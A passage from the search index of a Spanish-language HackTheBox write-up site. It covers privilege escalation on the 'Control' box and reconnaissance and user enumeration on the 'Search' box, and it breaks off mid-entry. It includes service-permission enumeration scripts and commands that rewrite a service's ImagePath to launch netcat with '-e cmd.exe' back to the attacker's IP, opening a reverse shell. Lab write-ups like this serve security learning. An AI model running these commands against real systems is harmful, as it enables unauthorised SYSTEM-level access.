}\n</code></pre> <p>Obteniendo as\u00ed una segunda revershell pero en esta ocasi\u00f3n como el usuario <code>hector</code>.</p> <p></p>","tags":["SQL Injection [SQLI] - Error Based","Advanced Bash Scripting (EXTRA)","SQLI to RCE (Into Outfile - PHP File Creation)","ConPtyShell (Fully Interactive Reverse Shell for Windows)","Playing with ScriptBlocks and PSCredential to execute commands as another user","AppLocker Bypass","WinPEAS Enumeration","Service ImagePath Hijacking (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Control/#hector-nt-authoritysystem","title":"hector \u2192 nt authority\\system","text":"<p>Buscando obtener informaci\u00f3n relevante para escalar como administrador, se ejecut\u00f3 winPEAS, identificando que se cuenta con un gran n\u00famero de registros a los cuales se tiene acceso completo.</p> <p></p> <p>Bajo el conocimiento de escenarios previos, se sabe que es posible modificar la configuraci\u00f3n de los servicios para poder secuestrar la ruta del binario, si se lograra identificar un servicio que se estuviera ejecutando como administrador al lograr la modificaci\u00f3n e iniciar el servicio se obtendr\u00eda acceso como administrador. Dichas configuraciones de servicios se suelen encontrar en los valores de los registros mostrados, por lo que, se realiz\u00f3 un filtrado de estos servicios bajo su perfil de ejecuci\u00f3n y status para que a la hora de modificarlo se pudiera iniciar el servicio.</p> <pre><code>$services = Get-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Services\\* # Para obtener todos los servicios\n$filtered_services = $services | where { ($_.ObjectName -match 'LocalSystem') -And ($_.Start -match '3') } # Para filtar y obtener los servicios que se ejecuten con permisos elevados y que se puedan iniciar manualmente\n</code></pre> <p>En este punto quedar\u00eda filtrar los servicios a los que el usuario hector cuenta con permisos para iniciar cualquier servicio. Para esto se requiere identificar el servicio que cuente con la cadena <code>RP</code> seg\u00fan es especificado en este blog en la propiedad de <code>Sddl</code> de los permisos desplegados de la lista actual de servicios.</p> <p></p> <p>Lo que individualmente por servicio es ubicado en la propiedad <code>Security</code>, en donde se encuentra en forma binaria.</p> <p></p> <p>Trasladandolo a una lectura similar a la propiedad <code>sddl</code>, se puede ejecutar <code>cmd /c sc sdshow wuauserv</code> para visualizar el valor de mejor manera.</p> <p></p> <p>Igualmente, el resultado no es entendible a menos que se busque alguna referencia para comparar, por lo que se puede hacer uso de:</p> <pre><code>ConvertFrom-SDDLString -Sddl \"D:(A;;CCLCSWRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)\"\n</code></pre> <p>Para visualizarlo de mejor manera ya que se permite su conversi\u00f3n mediante powershell.</p> <p></p> <p>Por lo que se iter\u00f3 en la lista previa de servicios la b\u00fasqueda de este permiso mediante el siguiente ciclo:</p> <pre><code>$services_names = $filtered_services.pschildname\nforeach ($service in $services_names) {\n    $sddl = (cmd /c sc sdshow $service)\n    if ($sddl -match \"RP[A-Z]*?;;;AU\") {\n        $service\n    }\n}\n\n# Iteraci\u00f3n en una l\u00ednea\n$canStartServices = foreach ($service in $services_names) {$sddl = (cmd /c sc sdshow $service); if ($sddl -match \"RP[A-Z]*?;;;AU\") { $service }}\n</code></pre> <p>Dando como resultado la lista de los servicios buscados.</p> <p></p> <p>Obteniendo lo anterior se puede modificar la propiedad <code>ImagePath</code> del servicio y ejecutar lo que se desee una vez que el servicio sea iniciado. Se puede lograr este comportamiento tanto como haciendo uso de cmd como de powershell.</p>","tags":["SQL Injection [SQLI] - Error Based","Advanced Bash Scripting (EXTRA)","SQLI to RCE (Into Outfile - PHP File Creation)","ConPtyShell (Fully Interactive Reverse Shell for Windows)","Playing with ScriptBlocks and PSCredential to execute commands as another user","AppLocker Bypass","WinPEAS Enumeration","Service ImagePath Hijacking (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Control/#usando-powershell","title":"Usando powershell","text":"<p>Mediante powershell habr\u00eda que:</p> <p></p> <ol> <li>Asegurar encontrarse en la ruta de los registros:</li> </ol> <pre><code>cd HKLM:\\system\\currentcontrolset\\services\n</code></pre> <ol> <li>Obtener las propiedades del servicio requerido:</li> </ol> <pre><code>get-item -path seclogon\n</code></pre> <ol> <li>Visualizar el valor a cambiar de <code>ImagePath</code></li> </ol> <p></p> <ol> <li>Ejecutar (para modificar los valores con los deseados):</li> </ol> <pre><code>set-itemproperty seclogon -name imagepath -value \"\\\\10.10.14.16\\smbFolder\\nc.exe -e cmd.exe 10.10.14.16 443\"\n</code></pre> <ol> <li>Obtener las propiedades del servicio requerido <code>seclogon</code> para validar el cambio.</li> <li>Visualizar el cambio realizado a <code>ImagePath</code>.</li> </ol> <p>El cual al montar la conexi\u00f3n de escucha, bastar\u00eda con iniciar el servicio con:</p> <pre><code>start-service seclogon\n</code></pre> <p>Para as\u00ed ejecutar el binario indicado.</p> <p></p>","tags":["SQL Injection [SQLI] - Error Based","Advanced Bash Scripting (EXTRA)","SQLI to RCE (Into Outfile - PHP File Creation)","ConPtyShell (Fully Interactive Reverse Shell for Windows)","Playing with ScriptBlocks and PSCredential to execute commands as another user","AppLocker Bypass","WinPEAS Enumeration","Service ImagePath Hijacking (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Control/#usando-cmd","title":"Usando cmd","text":"<p>Mediante cmd se realizar\u00eda el mismo procedimiento con respectivos cambios en los comandos debido que powershell configura alias en algunos comandos, por lo que, se ejecutar\u00eda:</p> <ol> <li>Para visualizar los valores del servicio:</li> </ol> <pre><code>reg query HKLM\\system\\currentcontrolset\\services\\seclogon\n</code></pre> <ol> <li>Para cambiar los valores de la propiedad <code>ImagePath</code> de acuerdo a lo encontrado en este blog para realizar los cambios e identificar el tipo de dato a cambiar <code>REG_EXPAND_SZ</code> para efectuarlo correctamente:</li> </ol> <pre><code>reg add HKLM\\system\\currentcontrolset\\services\\seclogon /v ImagePath /t REG_EXPAND_SZ /d \"\\\\10.10.14.16\\smbFolder\\nc.exe -e cmd.exe 10.10.14.16 443\" /f\n</code></pre> <ol> <li>Para iniciar el servicio:</li> </ol> <pre><code>sc start seclogon\n</code></pre>","tags":["SQL Injection [SQLI] - Error Based","Advanced Bash Scripting (EXTRA)","SQLI to RCE (Into Outfile - PHP File Creation)","ConPtyShell (Fully Interactive Reverse Shell for Windows)","Playing with ScriptBlocks and PSCredential to execute commands as another user","AppLocker Bypass","WinPEAS Enumeration","Service ImagePath Hijacking (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Control/#notas-adicionales","title":"Notas adicionales","text":"<p>Mientras resolv\u00eda la m\u00e1quina encontr\u00e9 diversos problemas para ejecutar el mismo binario de netcat, ya hubiera sido si lo cargaba directamente a la m\u00e1quina o lo ejecutaba a trav\u00e9s del cliente smb, logr\u00e9 solucionarlo empleando otra subida de netcat mediante el usuario obtenido conforme iba realizando la escalaci\u00f3n de privilegios.</p> <p>Dado que durante el proceso de resoluci\u00f3n personalmente busco lo equivalente a comparar respuestas en una evaluaci\u00f3n por lo que, suelo leer write-ups y ver walkthroughs de otros usuarios principalmente de 0xdf e IppSec, not\u00e9 que ambos hicieron referencia a AppLocker ya que el mismo problema se present\u00f3. Despu\u00e9s de buscar m\u00e1s informaci\u00f3n al respecto, encontr\u00e9 que existen rutas en Windows las cuales suelen estar libres de estas restricciones, encontrando varias listas de estas rutas en repositorios de github d\u00e1ndole motivo al uso de la ruta <code>C:\\Windows\\System32\\spool\\drivers\\color</code> que se emplea en los write-ups.</p>","tags":["SQL Injection [SQLI] - Error Based","Advanced Bash Scripting (EXTRA)","SQLI to RCE (Into Outfile - PHP File Creation)","ConPtyShell (Fully Interactive Reverse Shell for Windows)","Playing with ScriptBlocks and PSCredential to execute commands as another user","AppLocker Bypass","WinPEAS Enumeration","Service ImagePath Hijacking (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Control/#referencias","title":"Referencias","text":"<ul> <li>SQL Injection.</li> <li>CrackStation.</li> <li>SQLI to RCE.</li> <li>How to: Find the Web Application Root.</li> <li>How to use Start Process in PowerShell.</li> <li>Running commands in a specific user context in PowerShell.</li> <li>StackOverflow - PowerShell Jobs vs Start-Process.</li> <li>Powershell get computer name.</li> <li>How to edit the Registry using Command Prompt on Windows 10.</li> <li>Significado del valor Start en registros.</li> <li>Start Stop service rights to non administrators.</li> <li>What is AppLocker?.</li> <li>Ultimate AppLocker ByPass List.</li> </ul>","tags":["SQL Injection [SQLI] - Error Based","Advanced Bash Scripting (EXTRA)","SQLI to RCE (Into Outfile - PHP File Creation)","ConPtyShell (Fully Interactive Reverse Shell for Windows)","Playing with ScriptBlocks and PSCredential to execute commands as another user","AppLocker Bypass","WinPEAS Enumeration","Service ImagePath Hijacking (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Search/","title":"Search","text":"<p>Write-up de la m\u00e1quina Search de HackTheBox.</p> <p></p>","tags":["Information Leakage - Password in picture","RPC Enumeration (rpcclient)","Ldap Enumeration (ldapdomaindump)","Bloodhound Enumeration","Kerberoasting Attack (GetUserSPNs.py)","SMB Password Spray Attack (Crackmapexec)","Unprotecting password-protected Excel (Remove Protection)","Playing with pfx certificates","Gaining access to Windows PowerShell Web Access","Abusing ReadGMSAPassword privilege","Abusing GenericAll privilege (Resetting a user's password)","Gaining access with wmiexec"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Search/#indice","title":"\u00cdndice","text":"<ul> <li>Introducci\u00f3n</li> <li>Estad\u00edsticas</li> <li>Reconocimiento</li> <li>Escaneo de host<ul> <li>Escaneo completo de puertos</li> <li>Escaneo espec\u00edfico</li> </ul> </li> <li>Enumeraci\u00f3n</li> <li>Servicios<ul> <li>http - 80</li> <li>Manual</li> <li>ffuf</li> </ul> </li> <li>Explotaci\u00f3n</li> <li>Kerberoasting<ul> <li>Pasos previos | Preparaci\u00f3n</li> <li>Ejecuci\u00f3n</li> </ul> </li> <li>Password Spraying<ul> <li>web_svc \u2192 edgar.jacobs</li> <li>edgar.jacobs \u2192 sierra.frye</li> </ul> </li> <li>Post Explotaci\u00f3n</li> <li>Enumeraci\u00f3n</li> <li>Escalaci\u00f3n de privilegios<ul> <li>sierra.frya \u2192 tristan.davies</li> </ul> </li> <li>Notas adicionales</li> <li>Referencias</li> </ul>","tags":["Information Leakage - Password in picture","RPC Enumeration (rpcclient)","Ldap Enumeration (ldapdomaindump)","Bloodhound Enumeration","Kerberoasting Attack (GetUserSPNs.py)","SMB Password Spray Attack (Crackmapexec)","Unprotecting password-protected Excel (Remove Protection)","Playing with pfx certificates","Gaining access to Windows PowerShell Web Access","Abusing ReadGMSAPassword privilege","Abusing GenericAll privilege (Resetting a user's password)","Gaining access with wmiexec"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Search/#introduccion","title":"Introducci\u00f3n","text":"","tags":["Information Leakage - Password in picture","RPC Enumeration (rpcclient)","Ldap Enumeration (ldapdomaindump)","Bloodhound Enumeration","Kerberoasting Attack (GetUserSPNs.py)","SMB Password Spray Attack (Crackmapexec)","Unprotecting password-protected Excel (Remove Protection)","Playing with pfx certificates","Gaining access to Windows PowerShell Web Access","Abusing ReadGMSAPassword privilege","Abusing GenericAll privilege (Resetting a user's password)","Gaining access with wmiexec"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Search/#estadisticas","title":"Estad\u00edsticas","text":"Caracter\u00edstica Descripci\u00f3n Nombre Search OS Windows Dificultad oficial Hard Dificultad de comunidad Puntos 40 Creadores dmw0ng","tags":["Information Leakage - Password in picture","RPC Enumeration (rpcclient)","Ldap Enumeration (ldapdomaindump)","Bloodhound Enumeration","Kerberoasting Attack (GetUserSPNs.py)","SMB Password Spray Attack (Crackmapexec)","Unprotecting password-protected Excel (Remove Protection)","Playing with pfx certificates","Gaining access to Windows PowerShell Web Access","Abusing ReadGMSAPassword privilege","Abusing GenericAll privilege (Resetting a user's password)","Gaining access with wmiexec"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Search/#reconocimiento","title":"Reconocimiento","text":"","tags":["Information Leakage - Password in picture","RPC Enumeration (rpcclient)","Ldap Enumeration (ldapdomaindump)","Bloodhound Enumeration","Kerberoasting Attack (GetUserSPNs.py)","SMB Password Spray Attack (Crackmapexec)","Unprotecting password-protected Excel (Remove Protection)","Playing with pfx certificates","Gaining access to Windows PowerShell Web Access","Abusing ReadGMSAPassword privilege","Abusing GenericAll privilege (Resetting a user's password)","Gaining access with wmiexec"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Search/#escaneo-de-host","title":"Escaneo de host","text":"","tags":["Information Leakage - Password in picture","RPC Enumeration (rpcclient)","Ldap Enumeration (ldapdomaindump)","Bloodhound Enumeration","Kerberoasting Attack (GetUserSPNs.py)","SMB Password Spray Attack (Crackmapexec)","Unprotecting password-protected Excel (Remove Protection)","Playing with pfx certificates","Gaining access to Windows PowerShell Web Access","Abusing ReadGMSAPassword privilege","Abusing GenericAll privilege (Resetting a user's password)","Gaining access with wmiexec"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Search/#escaneo-completo-de-puertos","title":"Escaneo completo de puertos","text":"<pre><code>\u2514\u2500$ nmap -T5 --min-rate 5000 -v -p- -open -n -Pn -oG nmap/all_ports $TARGET\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.\nStarting Nmap 7.92 ( https://nmap.org ) at 2023-05-03 21:51 EDT\nInitiating Connect Scan at 21:51\nScanning 10.10.11.129 [65535 ports]\nDiscovered open port 139/tcp on 10.10.11.129\nDiscovered open port 80/tcp on 10.10.11.129\nDiscovered open port 53/tcp on 10.10.11.129\nDiscovered open port 443/tcp on 10.10.11.129\nDiscovered open port 445/tcp on 10.10.11.129\nDiscovered open port 135/tcp on 10.10.11.129\nDiscovered open port 8172/tcp on 10.10.11.129\nDiscovered open port 49710/tcp on 10.10.11.129\nDiscovered open port 9389/tcp on 10.10.11.129\nDiscovered open port 88/tcp on 10.10.11.129\nDiscovered open port 49675/tcp on 10.10.11.129\nDiscovered open port 3269/tcp on 10.10.11.129\nDiscovered open port 49699/tcp on 10.10.11.129\nDiscovered open port 3268/tcp on 10.10.11.129\nDiscovered open port 49667/tcp on 10.10.11.129\nDiscovered open port 464/tcp on 10.10.11.129\nDiscovered open port 49676/tcp on 10.10.11.129\nDiscovered open port 49737/tcp on 10.10.11.129\nDiscovered open port 389/tcp on 10.10.11.129\nDiscovered open port 593/tcp on 10.10.11.129\nDiscovered open port 636/tcp on 10.10.11.129\nCompleted Connect Scan at 21:51, 26.37s elapsed (65535 total ports)\nNmap scan report for 10.10.11.129\nHost is up (0.076s latency).\nNot shown: 65514 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT      STATE SERVICE\n53/tcp    open  domain\n80/tcp    open  http\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n443/tcp   open  https\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n8172/tcp  open  unknown\n9389/tcp  open  adws\n49667/tcp open  unknown\n49675/tcp open  unknown\n49676/tcp open  unknown\n49699/tcp open  unknown\n49710/tcp open  unknown\n49737/tcp open  unknown\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 26.40 seconds\n</code></pre>","tags":["Information Leakage - Password in picture","RPC Enumeration (rpcclient)","Ldap Enumeration (ldapdomaindump)","Bloodhound Enumeration","Kerberoasting Attack (GetUserSPNs.py)","SMB Password Spray Attack (Crackmapexec)","Unprotecting password-protected Excel (Remove Protection)","Playing with pfx certificates","Gaining access to Windows PowerShell Web Access","Abusing ReadGMSAPassword privilege","Abusing GenericAll privilege (Resetting a user's password)","Gaining access with wmiexec"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Search/#escaneo-especifico","title":"Escaneo espec\u00edfico","text":"<pre><code>\u2514\u2500$ nmap -sCV -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,8172,9389,49667,49675,49676,49699,49710,49737 -n -Pn -oN nmap/targeted $TARGET\nStarting Nmap 7.92 ( https://nmap.org ) at 2023-05-03 21:54 EDT\nNmap scan report for 10.10.11.129\nHost is up (0.27s latency).\n\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: Search &amp;mdash; Just Testing IIS\n| http-methods:\n|_  Potentially risky methods: TRACE\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-04 01:54:40Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=research\n| Not valid before: 2020-08-11T08:13:35\n|_Not valid after:  2030-08-09T08:13:35\n|_ssl-date: 2023-05-04T01:56:19+00:00; 0s from scanner time.\n443/tcp   open  ssl/http      Microsoft IIS httpd 10.0\n|_ssl-date: 2023-05-04T01:56:18+00:00; 0s from scanner time.\n| ssl-cert: Subject: commonName=research\n| Not valid before: 2020-08-11T08:13:35\n|_Not valid after:  2030-08-09T08:13:35\n| tls-alpn:\n|_  http/1.1\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-title: Search &amp;mdash; Just Testing IIS\n|_http-server-header: Microsoft-IIS/10.0\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=research\n| Not valid before: 2020-08-11T08:13:35\n|_Not valid after:  2030-08-09T08:13:35\n|_ssl-date: 2023-05-04T01:56:18+00:00; 0s from scanner time.\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2023-05-04T01:56:18+00:00; 0s from scanner time.\n| ssl-cert: Subject: commonName=research\n| Not valid before: 2020-08-11T08:13:35\n|_Not valid after:  2030-08-09T08:13:35\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=research\n| Not valid before: 2020-08-11T08:13:35\n|_Not valid after:  2030-08-09T08:13:35\n|_ssl-date: 2023-05-04T01:56:18+00:00; 0s from scanner time.\n8172/tcp  open  ssl/http      Microsoft IIS httpd 10.0\n| tls-alpn:\n|_  http/1.1\n| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH\n| Not valid before: 2020-04-07T09:05:25\n|_Not valid after:  2030-04-05T09:05:25\n|_ssl-date: 2023-05-04T01:56:18+00:00; 0s from scanner time.\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: Site doesn't have a title.\n9389/tcp  open  mc-nmf        .NET Message Framing\n49667/tcp open  msrpc         Microsoft Windows RPC\n49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49676/tcp open  msrpc         Microsoft Windows RPC\n49699/tcp open  msrpc         Microsoft Windows RPC\n49710/tcp open  msrpc         Microsoft Windows RPC\n49737/tcp open  msrpc         Microsoft Windows RPC\nService Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   date: 2023-05-04T01:55:42\n|_  start_date: N/A\n| smb2-security-mode:\n|   3.1.1:\n|_    Message signing enabled and required\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 112.17 seconds\n</code></pre>","tags":["Information Leakage - Password in picture","RPC Enumeration (rpcclient)","Ldap Enumeration (ldapdomaindump)","Bloodhound Enumeration","Kerberoasting Attack (GetUserSPNs.py)","SMB Password Spray Attack (Crackmapexec)","Unprotecting password-protected Excel (Remove Protection)","Playing with pfx certificates","Gaining access to Windows PowerShell Web Access","Abusing ReadGMSAPassword privilege","Abusing GenericAll privilege (Resetting a user's password)","Gaining access with wmiexec"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Search/#enumeracion","title":"Enumeraci\u00f3n","text":"","tags":["Information Leakage - Password in picture","RPC Enumeration (rpcclient)","Ldap Enumeration (ldapdomaindump)","Bloodhound Enumeration","Kerberoasting Attack (GetUserSPNs.py)","SMB Password Spray Attack (Crackmapexec)","Unprotecting password-protected Excel (Remove Protection)","Playing with pfx certificates","Gaining access to Windows PowerShell Web Access","Abusing ReadGMSAPassword privilege","Abusing GenericAll privilege (Resetting a user's password)","Gaining access with wmiexec"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Search/#servicios","title":"Servicios","text":"","tags":["Information Leakage - Password in picture","RPC Enumeration (rpcclient)","Ldap Enumeration (ldapdomaindump)","Bloodhound Enumeration","Kerberoasting Attack (GetUserSPNs.py)","SMB Password Spray Attack (Crackmapexec)","Unprotecting password-protected Excel (Remove Protection)","Playing with pfx certificates","Gaining access to Windows PowerShell Web Access","Abusing ReadGMSAPassword privilege","Abusing GenericAll privilege (Resetting a user's password)","Gaining access with wmiexec"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Search/#http-80","title":"http - 80","text":"","tags":["Information Leakage - Password in picture","RPC Enumeration (rpcclient)","Ldap Enumeration (ldapdomaindump)","Bloodhound Enumeration","Kerberoasting Attack (GetUserSPNs.py)","SMB Password Spray Attack (Crackmapexec)","Unprotecting password-protected Excel (Remove Protection)","Playing with pfx certificates","Gaining access to Windows PowerShell Web Access","Abusing ReadGMSAPassword privilege","Abusing GenericAll privilege (Resetting a user's password)","Gaining access with wmiexec"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Search/#manual","title":"Manual","text":"<p>La p\u00e1gina principal muestra personas de la empresa, las cuales podr\u00edan representar potenciales nombres de usuario dado que se puede asumir que trata de un Domain Controller dados los puertos abiertos (53,88).</p> <p></p> <p>Adicionalmente se identific\u00f3 dentro de la secci\u00f3n que habla acerca de los servicios de la empresa una imagen con anotaciones en ella.</p> <p></p> <p>Al prestar atenci\u00f3n a las notas escritas, se puede identificar el nombre de dos personas y una posible contrase\u00f1a.</p> <p></p> <ol> <li><code>IsolationIsKey?</code>.</li> </ol>","tags":["Information Leakage - Password in picture","RPC Enumeration (rpcclient)","Ldap Enumeration (ldapdomaindump)","Bloodhound Enumeration","Kerberoasting Attack (GetUserSPNs.py)","SMB Password Spray Attack (Crackmapexec)","Unprotecting password-protected Excel (Remove Protection)","Playing with pfx certificates","Gaining access to Windows PowerShell Web Access","Abusing ReadGMSAPassword privilege","Abusing GenericAll privilege (Resetting a user's password)","Gaining access with wmiexec"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Search/#ffuf","title":"ffuf","text":"<p>Por otro lado, por medio de <code>ffuf</code> se identificaron las siguientes rutas de las cuales a pesar de no tener acceso sobresalen <code>/staff</code> y <code>/certsrv</code>.</p> <pre><code>\u2514\u2500$ ffuf -c -ic -u \"http://10.10.11.129/FUZZ\" -w /usr/share/wordlists/dirb/common.txt\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.5.0 Kali Exclusive &lt;3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.11.129/FUZZ\n :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n________________________________________________\n\n                        [Status: 200, Size: 44982, Words: 13260, Lines: 1030, Duration: 213ms]\ncertenroll              [Status: 301, Size: 154, Words: 9, Lines: 2, Duration: 142ms]\ncertsrv                 [Status: 401, Size: 1293, Words: 81, Lines: 30, Duration: 206ms]\ncss                     [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 597ms]\nfonts                   [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 72ms]\nimages                  [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 72ms]\nImages                  [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 72ms]\nindex.html              [Status: 200, Size: 44982, Words: 13260, Lines: 1030, Duration: 73ms]\njs                      [Status: 301, Size: 146, Words: 9, Lines: 2, Duration: 546ms]\nstaff                   [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 3971ms]\n:: Progress: [4614/4614] :: Job [1/1] :: 263 req/sec :: Duration: [0:00:34] :: Errors: 0 ::\n</code></pre>","tags":["Information Leakage - Password in picture","RPC Enumeration (rpcclient)","Ldap Enumeration (ldapdomaindump)","Bloodhound Enumeration","Kerberoasting Attack (GetUserSPNs.py)","SMB Password Spray Attack (Crackmapexec)","Unprotecting password-protected Excel (Remove Protection)","Playing with pfx certificates","Gaining access to Windows PowerShell Web Access","Abusing ReadGMSAPassword privilege","Abusing GenericAll privilege (Resetting a user's password)","Gaining access with wmiexec"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Search/#explotacion","title":"Explotaci\u00f3n","text":"","tags":["Information Leakage - Password in picture","RPC Enumeration (rpcclient)","Ldap Enumeration (ldapdomaindump)","Bloodhound Enumeration","Kerberoasting Attack (GetUserSPNs.py)","SMB Password Spray Attack (Crackmapexec)","Unprotecting password-protected Excel (Remove Protection)","Playing with pfx certificates","Gaining access to Windows PowerShell Web Access","Abusing ReadGMSAPassword privilege","Abusing GenericAll privilege (Resetting a user's password)","Gaining access with wmiexec"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Search/#kerberoasting","title":"Kerberoasting","text":"","tags":["Information Leakage - Password in picture","RPC Enumeration (rpcclient)","Ldap Enumeration (ldapdomaindump)","Bloodhound Enumeration","Kerberoasting Attack (GetUserSPNs.py)","SMB Password Spray Attack (Crackmapexec)","Unprotecting password-protected Excel (Remove Protection)","Playing with pfx certificates","Gaining access to Windows PowerShell Web Access","Abusing ReadGMSAPassword privilege","Abusing GenericAll privilege (Resetting a user's password)","Gaining access with wmiexec"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Search/#pasos-previos-preparacion","title":"Pasos previos | Preparaci\u00f3n","text":"<p>Dados los nombres identificados se realiz\u00f3 una lista con variaciones de nombres usuarios que suelen presentarse en entornos de directorio activo o que suelen ser comunes en empresas. Para corroborar aquellos v\u00e1lidos contra la m\u00e1quina.</p> <pre><code>Keely Lyons\nDax Santiago\nSierra Frye\nKyla Stewart\nKaiara Spencer\nDave Simpson\nBen Thompson\nChris Stewart\nPhisher Walter\nHope Sharp\nKeely.Lyons\nDax.Santiago\nSierra.Frye\nKyla.Stewart\nKaiara.Spencer\nDave.Simpson\nBen.Thompson\nChris.Stewart\nPhisher.Walter\nHope.Sharp\nKLyons\nDSantiago\nSFrye\nKStewart\nKSpencer\nDSimpson\nBThompson\nCStewart\nPWalter\nHSharp\nKeelyL\nDaxS\nSierraF\nKylaS\nKaiaraS\nDaveS\nBenT\nChrisS\nPhisherW\nHopeS\n</code></pre> <pre><code>\u2514\u2500$ /opt/tools/windows/active_directory/kerbrute/kerbrute userenum content/users.txt --dc search.htb -d search.htb\n\n    __             __               __\n   / /_____  _____/ /_  _______  __/ /____\n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/\n\nVersion: v1.0.3 (9dad6e1) - 05/05/23 - Ronnie Flathers @ropnop\n\n2023/05/05 16:27:17 &gt;  Using KDC(s):\n2023/05/05 16:27:17 &gt;   search.htb:88\n\n2023/05/05 16:27:17 &gt;  [+] VALID USERNAME:       Sierra.Frye@search.htb\n2023/05/05 16:27:17 &gt;  [+] VALID USERNAME:       Dax.Santiago@search.htb\n2023/05/05 16:27:17 &gt;  [+] VALID USERNAME:       Keely.Lyons@search.htb\n2023/05/05 16:27:17 &gt;  [+] VALID USERNAME:       Hope.Sharp@search.htb\n2023/05/05 16:27:18 &gt;  Done! Tested 40 usernames (4 valid) in 0.724 seconds\n</code></pre>","tags":["Information Leakage - Password in picture","RPC Enumeration (rpcclient)","Ldap Enumeration (ldapdomaindump)","Bloodhound Enumeration","Kerberoasting Attack (GetUserSPNs.py)","SMB Password Spray Attack (Crackmapexec)","Unprotecting password-protected Excel (Remove Protection)","Playing with pfx certificates","Gaining access to Windows PowerShell Web Access","Abusing ReadGMSAPassword privilege","Abusing GenericAll privilege (Resetting a user's password)","Gaining access with wmiexec"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Search/#ejecucion","title":"Ejecuci\u00f3n","text":"<p>Habiendo identificado el patr\u00f3n y el usuario <code>Hope.Sharp</code> como v\u00e1lido, se intent\u00f3 autenticar 